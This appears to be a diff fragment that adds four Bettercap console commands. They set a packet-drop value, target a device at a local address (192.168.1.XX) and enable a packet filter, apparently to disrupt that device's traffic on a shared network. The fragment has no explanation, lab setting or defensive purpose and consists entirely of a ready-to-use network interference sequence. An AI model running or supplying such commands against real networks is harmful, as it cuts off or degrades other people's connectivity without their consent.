@@ -1,0 +1,4 @@
+# In Bettercap console:
+set packet.filter.drop 20
+set packet.filter.targets 192.168.1.XX
+packet.filter on
